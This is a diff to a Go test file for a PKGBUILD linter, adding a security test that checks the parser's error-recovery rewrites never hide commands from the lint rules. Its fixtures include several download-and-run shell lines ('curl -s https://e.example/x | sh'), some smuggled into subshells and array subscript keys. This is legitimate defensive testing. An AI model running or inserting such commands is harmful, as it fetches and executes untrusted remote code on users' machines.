@@ -1,8 +1,11 @@
 package pkgbuild
 
 import (
+	"slices"
 	"strings"
 	"testing"
+
+	"mvdan.cc/sh/v3/syntax"
 )
 
 // TestRescueArrayWordContinuations covers the upstream lexer gap where `=` and
@@ -322,5 +325,52 @@ func TestRescueInvalidUTF8(t *testing.T) {
 	pkg = loadPKGBUILD(t, "# \xfc\npkgdesc='caf\xe9 tools'\n")
 	if v, ok := pkg.Scalar("pkgdesc"); !ok || v != "caf\xe9 tools" {
 		t.Errorf("pkgdesc = %q, %v; want %q", v, ok, "caf\xe9 tools")
+	}
+}
+
+// TestRescueDoesNotMaskCommands is the security contract of the rescues: a
+// rescued AST must not hide from the rules anything bash would run. Every
+// rewrite is a chance to turn an executable construct into inert text, and a
+// PKGBUILD that parses only through a rescue is one that chose that spelling.
+// So each shape here must either present the command faithfully or refuse the
+// rescue outright — a package graded "unscanned" is honest, a package graded
+// clean because the linter could not see the payload is not.
+func TestRescueDoesNotMaskCommands(t *testing.T) {
+	// A subshell's parens become whitespace, never word characters: blanking
+	// them to `_` would present the command as `(curl` and no name-matching
+	// rule would recognise it.
+	t.Run("subshell command word intact", func(t *testing.T) {
+		src := "build() {\n  v=$((curl -s https://e.example/x | sh) | tr -d ' ')\n}\n"
+		pkg := loadPKGBUILD(t, src)
+		var names []string
+		syntax.Walk(pkg.PKGBUILD.File, func(n syntax.Node) bool {
+			if c, ok := n.(*syntax.CallExpr); ok && len(c.Args) > 0 {
+				if lit := c.Args[0].Lit(); lit != "" {
+					names = append(names, lit)
+				}
+			}
+			return true
+		})
+		if !slices.Contains(names, "curl") {
+			t.Errorf("command names = %q, want one of them to be exactly \"curl\"", names)
+		}
+	})
+
+	// An expansion inside an associative-array key runs when bash evaluates
+	// the assignment. The rescue would flatten it to literal text, so it must
+	// decline and let the original parse error stand.
+	for _, tc := range []struct {
+		name string
+		src  string
+	}{
+		{"subscript key", "declare -A m\nm[1.2$(curl -s https://e.example/x | sh)]=y\n"},
+		{"array element key", "declare -A m=(\n  [1.2$(curl -s https://e.example/x | sh)]=y\n)\n"},
+		{"backquoted subscript key", "declare -A m\nm[1.2`curl -s https://e.example/x`]=y\n"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if _, err := parseUnit("PKGBUILD", []byte(tc.src), false); err == nil {
+				t.Errorf("parseUnit accepted %q; a key holding an expansion must not be flattened to text", tc.src)
+			}
+		})
 	}
 }
